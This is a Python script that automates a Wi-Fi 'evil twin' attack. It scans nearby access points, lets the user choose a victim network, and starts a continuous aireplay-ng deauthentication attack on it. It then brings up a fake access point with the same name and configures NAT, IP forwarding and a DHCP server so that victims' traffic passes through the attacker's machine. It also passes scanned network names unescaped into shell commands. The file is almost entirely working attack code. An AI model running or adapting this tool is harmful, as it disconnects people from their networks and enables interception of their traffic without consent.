#!/usr/bin/env python3.6
import os
import apt
import subprocess
import csv
import time
#import signal
#yes = {"yes","y","ye",""}
#no = {"n","no"}
print('checking the working environment')
distro=subprocess.Popen(["uname","-s"],stdout=subprocess.PIPE)
output = str(distro.stdout.read())
check=(output.rfind('Linux'))
print(check)
if check == -1:
    exit()
else:
    print("we can continue")
#print("Now checking for other prerequisite")
print("Lets check if you have installed what script needs")
cache = apt.Cache()
pakg =["aircrack-ng","iptables","isc-dhcp-server","apache2","mysql-common"]
for a in range(0,5):
    if cache[pakg[a]].is_installed:
        print(pakg[a],"...is installed") 
    else:
        print(" installing ",pakg[a])
        pkgstr = str(pakg[a])
        proc = subprocess.Popen('apt-get install -y %s'%(pkgstr), shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
        proc.wait()
        print(pkgstr,"is now installed you are good to go")
    a=++a


fo = open("/etc/dhcp/dhcpd.conf","a+")
fo.write("""
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0
{
        option subnet-mask 255.255.255.0;
        option broadcast-address 192.168.1.255;
        option routers 192.168.1.1;
        option domain-name-servers 8.8.8.8;
        range 192.168.1.1 192.168.1.100;
} """
)
fo.close()
networkcards = os.listdir("/sys/class/net")
#print(networkcards[int(gg)])
continum = list(range(len(networkcards)))
dictt = dict(zip(continum,networkcards))
print(dictt)
for k,v in dictt.items():
    print(k,"-",v)
mon=input("choose the corresponding number to wireless card(0,1,2,3...) which support monitor mode:-")
air1 = networkcards[int(mon)]
print("turning",air1,"into monitor mode")
airmonng = subprocess.Popen('airmon-ng start %s'%(air1),shell=True,stdin=None,stdout=open("/dev/null","w"),stderr=None,executable="/bin/bash")
airmonng.wait()
networkcards1 = os.listdir("/sys/class/net")
matching = [s for s in networkcards1 if "mon" in s ]
print(matching[0])
try:
    subprocess.run(['airodump-ng',matching[0],'-w','dump','--output-format','csv'],timeout=5,stdin=None,stderr=None)
except subprocess.TimeoutExpired:
    print("work is done")
inpu = open("dump-01.csv",'r')
output = open("finalized.csv",'w')
writer = csv.writer(output)
for row in csv.reader(inpu):
    if len(row)==15:
        writer.writerow(row)
inpu.close()
output.close()
subprocess.run(['reset'],stdin=None,stderr=None)

with open("finalized.csv") as csvfile:
    readCSV = csv.reader(csvfile,delimiter=",")
    names = []
    for row in readCSV:
        name = (row[13])
        names.append(name)
continum1 = list(range(len(names)))
dictt1 = dict(zip(continum1,names))
print(dictt1)
for k,v in dictt1.items():
    print(k,"-",v)
choose1 = input("enter the number:")
print("you entered for",dictt1[int(choose1)])
#ss = str(dictt1[int(choose1)])
#print(ss)

with open("finalized.csv") as csvfile1:
    readCSV1 = csv.reader(csvfile1,delimiter=",")
    row1 = list(readCSV1)
use1 = list(row1[int(choose1)])
print(use1)

airmonng1 = subprocess.Popen('airmon-ng stop %s'%(matching[0]),shell=True,stdin=None,stdout=open("/dev/null","w"),stderr=None,executable="/bin/bash")
airmonng1.wait()
string1 = str(use1[3])
string2 = string1.lstrip()
#print(string2)
airmonng2 = subprocess.Popen('airmon-ng start %s %s'%(air1,string2),shell=True,stdin=None,stdout=open("/dev/null","w"),stderr=None,executable="/bin/bash")
airmonng2.wait()
print("now starting deauth attack for the victim")
string3 = str(use1[0])
string4 = string3.lstrip()
print(string4)
deauth = subprocess.Popen('mate-terminal -x aireplay-ng --deauth 0 -a %s %s &'%(string4,matching[0]),shell=True,stdin=None,stderr=None) 
forfake = dictt1[int(choose1)]
forfake1 = forfake.lstrip()
print(forfake1)
fakeap = subprocess.Popen('mate-terminal -x airbase-ng -e %s %s &'%(forfake1,matching[0]),shell=True,stdin=None,stderr=None)
time.sleep(5)
allocip = subprocess.Popen('ifconfig at0 192.168.1.1 netmask 255.255.255.0',shell=True,stdin=None,stderr=None) 
print("its work 1")
time.sleep(5)
allocip1 = subprocess.Popen('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1',shell=True,stdin=None,stderr=None) 
print("its work 2")
time.sleep(5)

ipforwd = subprocess.Popen('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',shell=True,stdin=None,stderr=None) 
print("its work 3")
time.sleep(5)
ipforwd1 = subprocess.Popen('iptables --append FORWARD --in-interface at0 -j ACCEPT',shell=True,stdin=None,stderr=None) 
print("its work 4")
time.sleep(5)
ipforwd2 = subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True,stdin=None,stderr=None) 
print("its work 5")
dhcplistner = subprocess.Popen('dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0',shell=True,stdin=None,stderr=None) 
print("its work 6")
dhcpserver = subprocess.Popen('systemctl start isc-dhcp-server',shell=True,stdin=None,stderr=None) 
print("its work 7")




